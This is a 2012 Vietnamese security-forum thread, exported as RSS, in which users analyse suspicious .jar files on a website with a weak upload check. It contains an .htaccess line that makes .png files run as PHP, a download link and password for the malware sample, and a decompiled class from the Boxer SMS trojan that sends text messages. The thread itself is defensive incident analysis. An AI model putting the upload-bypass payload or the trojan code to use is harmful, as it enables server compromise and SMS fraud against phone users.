<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "Nhờ phân tích Java class file?"]]></title>
		<link>http://www.hvaonline.net/hvaonline/posts/list/28.html</link>
		<description><![CDATA[Latest messages posted in the topic "Nhờ phân tích Java class file?"]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>Nhờ phân tích Java class file?</title>
				<description><![CDATA[ Chào mọi người,

Một người bạn của mình có một website cho phép upload *.jar và *.png file. Mình có xem qua thì thấy chỉ check extension thôi, kiểu thế này:
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>&lt;input type="file" maxlength="10" accept="jar" class="multi MultiFile-applied" name="up_file&#91;&#93;" value=""&gt;</pre>
		</div>

Và chuyện đã xảy ra: gần đây, họ thấy có file lạ (*.jar) trong một số thư mục (không phải là thư mục cho phép upload). Anh ta có thử `chown root:root` các files này, nhưng hôm sau vẫn thấy overwrite được.

Mình đang nghĩ đến một số hướng:
- Tắt javascript, inspect element trên, thay accept="jar" thành accept="php" và upload file PHP lên. Kết quả: chỉ có 2 file .jar và .jad được upload lên thôi. Mình cũng chưa nghĩ ra cách nào để upload .htaccess lên và cho phép execute .png như PHP cả:
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>AddHandler application/x-httpd-php .png</pre>
		</div>
- Mình có nghe nói đến GIFAR:<span class="link"> http://xs-sniper.com/blog/2008/12/17/sun-fixes-gifars/,</span> nhưng Sun đã fixed từ... lâu lắm rồi.

Mình có dùng ClamAV quét thử thì phát hiện trong một số .jar files có vài chú virus thế này:
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>.jar: Java.Trojan.Boxer FOUND

----------- SCAN SUMMARY -----------
Known viruses: 1214068
Engine version: 0.97.3
Scanned directories: 0
Scanned files: 1
Infected files: 1
Data scanned: 0.03 MB
Data read: 0.07 MB &#40;ratio 0.47:1&#41;
Time: 8.659 sec &#40;0 m 8 s&#41;</pre>
		</div>

Nhờ các bạn cùng trợ giúp.

Download:<span class="link"> http://www.mediafire.com/?l3cp5qpp6wtea4o</span>
Password: hva

Thanks,
]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/42241.html#262946</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/42241.html#262946</link>
				<pubDate><![CDATA[Thu, 10 May 2012 23:31:56]]> GMT</pubDate>
				<author><![CDATA[ quanta]]></author>
			</item>
			<item>
				<title>Nhờ phân tích Java class file?</title>
				<description><![CDATA[ Scan file class mà bạn upload lên, KAV báo có trojan SMS.J2ME.Boxer.j (Trojan trên smart phone?)
<blockquote>Trojan-SMS.J2ME.Boxer.j - by Kaspersky Lab
Trojan-SMS - by Ikarus
Harmful Beheavor Summary:
Contains characteristics of an identified security risk.
Trojan-SMS.J2ME.Boxer.j,Trojan-SMS,Trojan.Generic,Trojan Horse Action:Trojan-SMS.J2ME.Boxer.j,Trojan-SMS,Trojan.Generic,Trojan Horse Action:
Threat Category Description:A malicious trojan horse or bot that may represent security risk for the compromised system and/or its network environment

Create Following Files In System:

1%Temp%\a.class4,322 bytesMD5: 0x33032F7602FE6E18387B18D9A8A4DDCB
SHA-1: 0xA18FD6EED2819A1AC9CBD6DA3912F2D3F564F3D4(not available)2%Temp%\b.class1,747 bytesMD5: 0x2A1F880DC52765DC892D8B7A12B2742C
SHA-1: 0xD21E39B29852A8D69EE4BC5AEC3B1F9260F11BB5Trojan.Generic - by PCTools
Trojan Horse - by Symantec
Trojan-SMS.J2ME.Boxer.j - by Kaspersky Lab
Trojan-SMS - by Ikarus3%Temp%\icon.png697 bytesMD5: 0x39BAA3944A8BCB77F3E52C3A2E565B97
SHA-1: 0xE45ED2AA49868E1C54B68B12545B8835C1558FEE(not available)4%Temp%\img.jpg20,052 bytesMD5: 0x36C21881CC0AF27B935423B95DE6F725
SHA-1: 0x1460A36E3404C8AAE7D44821C2CE4B626F82B4BD(not available)5%Temp%\mask.png112 bytesMD5: 0x5689B5C6F885F9AB1C86DC205955BB38
SHA-1: 0xDC6AA20E7C6132A30409A07B77EB3ADD927FF75A(not available)6%Temp%\META-INF\MANIFEST.MF439 bytesMD5: 0x0B7C6307189B5D70C6BFD6A01242B8B7
SHA-1: 0xBDE3A59D4F3009487DE2C31C4980FE33865105E0(not available)7%Temp%\SmsBox.class3,948 bytesMD5: 0x545E3E31498FF76F3086D8330E576FB9
SHA-1: 0x232543AE0CB8ECCF62CDE4A4AB4D1042384E302CTrojan.Generic - by PCTools
Trojan Horse - by Symantec
Trojan-SMS.J2ME.Boxer.j - by Kaspersky Lab
Trojan-SMS - by Ikarus8 Sample Name #125,602 bytesMD5: 0x5AFA0225096E71C17AF5799CF128260E
SHA-1: 0x62DCB244CBC54A0BD4D159D2AB29CCFD6CB116E8Trojan-SMS.J2ME.Boxer.j - by Kaspersky Lab
Trojan-SMS - by Ikarus


%Temp% is a variable that refers to the temporary folder in the short path form. By default, this is C:\Documents and Settings\[UserName\Local Settings\Temp\ (Windows NT/2000/XP).
The following directory was created:
%Temp%\META-INF&nbsp;
		</blockquote>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/42241.html#262961</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/42241.html#262961</link>
				<pubDate><![CDATA[Fri, 11 May 2012 02:48:25]]> GMT</pubDate>
				<author><![CDATA[ neverwon]]></author>
			</item>
			<item>
				<title>Nhờ phân tích Java class file?</title>
				<description><![CDATA[ Chỉ là SMS trojan thôi. Hầu hết các AV đã chụp nó.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/42241.html#262962</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/42241.html#262962</link>
				<pubDate><![CDATA[Fri, 11 May 2012 02:54:35]]> GMT</pubDate>
				<author><![CDATA[ TQN]]></author>
			</item>
			<item>
				<title>Nhờ phân tích Java class file?</title>
				<description><![CDATA[ Client dùng jquery.MultiFile.js để check:<span class="link"> http://code.google.com/p/jquery-multifile-plugin/source/browse/trunk/jquery.MultiFile.js</span>

Còn đây là một phần đoạn code trên server:
 <span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>$nofile = count&#40;$files&#91;'name'&#93;&#41;;
    for&#40;$i = 0; $i &lt; $nofile; $i++&#41;
    {
        if&#40;empty&#40;$files&#91;'name'&#93;&#91;$i&#93;&#41;&#41;
        {
            // $step = 1;
            break;
        } else
        {
            $strExt = &quot;.jar&quot;;
            $app_name = substr&#40;$files&#91;&quot;name&quot;&#93;&#91;$i&#93;,0,-4&#41;;
            //echo $app_name;
            //$app_name = $files&#91;&quot;name&quot;&#93;&#91;$i&#93;;
            if&#40;$files&#91;&quot;error&quot;&#93;&#91;$i&#93;&#41;
            {
                $strStatus = $files&#91;'name'&#93;&#91;$i&#93;.': Error code: '.$files&#91;&quot;error&quot;&#93;&#91;$i&#93;;
                $strStatus_arr&#91;&#93; = $strStatus;
//                 $step = 1;
            } else
            {
                if&#40;$files&#91;&quot;size&quot;&#93;&#91;$i&#93; &gt; MAX_SIZE&#41;
                {
                    $strStatus = $files&#91;'name'&#93;&#91;$i&#93;.&quot;: Error: File lớn hơn dung lượng cho phép &#40;&quot;.&#40;int&#41;&#40;$files&#91;&quot;size&quot;&#93;&#91;$i&#93; / 1024&#41;.&quot;Kbs&#41;&quot;;
                    $strStatus_arr&#91;&#93; = $strStatus;
//                     $step = 1;
                } else
                {
                    $fname0ext = md5&#40;uniqid&#40;mt_rand&#40;&#41;, true&#41;&#41;;
                    $strFileName = $fname0ext.$strExt;
                    // $abs_path = '';
                    $abs_path = '';
                    $folder = $abs_path.&quot;tmpfile2/&quot;;
                    $file_path = $folder.$strFileName;
                    move_uploaded_file&#40;$files&#91;&quot;tmp_name&quot;&#93;&#91;$i&#93;, $file_path&#41;;

                    $lid = log_genapp&#40;$partner_code, 'license', $app_name, ''&#41;;</pre>
		</div>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/42241.html#262970</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/42241.html#262970</link>
				<pubDate><![CDATA[Fri, 11 May 2012 03:34:39]]> GMT</pubDate>
				<author><![CDATA[ quanta]]></author>
			</item>
			<item>
				<title>Nhờ phân tích Java class file?</title>
				<description><![CDATA[ Dây là một java class đơn giản:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>import javax.microedition.io.Connection;
import javax.microedition.io.Connector;
import javax.wireless.messaging.Message;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;

public final class a
  implements Runnable
{
  private String jdField_a_of_type_JavaLangString;
  private String b;
  private boolean jdField_a_of_type_Boolean;
  private Thread jdField_a_of_type_JavaLangThread;

  public final void a&#40;String paramString1, String paramString2&#41;
  {
    if &#40;this.jdField_a_of_type_JavaLangThread == null&#41;
    {
      this.jdField_a_of_type_JavaLangString = paramString2;
      this.b = &#40;"sms://" + paramString1&#41;;
      this.jdField_a_of_type_Boolean = false;
      this.jdField_a_of_type_JavaLangThread = new Thread&#40;this&#41;;
      this.jdField_a_of_type_JavaLangThread.start&#40;&#41;;
    }
  }

  public final void run&#40;&#41;
  {
    MessageConnection localMessageConnection = null;
    try
    {
      TextMessage localTextMessage;
      &#40;localTextMessage = &#40;TextMessage&#41;&#40;localMessageConnection = &#40;MessageConnection&#41;Connector.open&#40;this.b&#41;&#41;.newMessage&#40;"text"&#41;&#41;.setAddress&#40;this.b&#41;;
      localTextMessage.setPayloadText&#40;this.jdField_a_of_type_JavaLangString&#41;;
      localMessageConnection.send&#40;localTextMessage&#41;;
      this.jdField_a_of_type_Boolean = true;
    }
    catch &#40;Throwable localThrowable&#41;
    {
      this.jdField_a_of_type_Boolean = false;
    }
    finally
    {
      if &#40;localMessageConnection != null&#41;
        try
        {
          localMessageConnection.close&#40;&#41;;
        }
        catch &#40;Exception localException3&#41;
        {
        }
    }
    synchronized &#40;this&#41;
    {
      this.jdField_a_of_type_JavaLangThread = null;
      return;
    }
  }

  public final boolean a&#40;&#41;
  {
    try
    {
      this.jdField_a_of_type_JavaLangThread.join&#40;&#41;;
    }
    catch &#40;Exception localException&#41;
    {
    }
    return this.jdField_a_of_type_Boolean;
  }
}</pre>
		</div>

Cần thêm những file khác được load lên để chạy thì mới biết chính xác nó send cái gì.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/42241.html#262972</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/42241.html#262972</link>
				<pubDate><![CDATA[Fri, 11 May 2012 03:59:55]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
	</channel>
</rss>
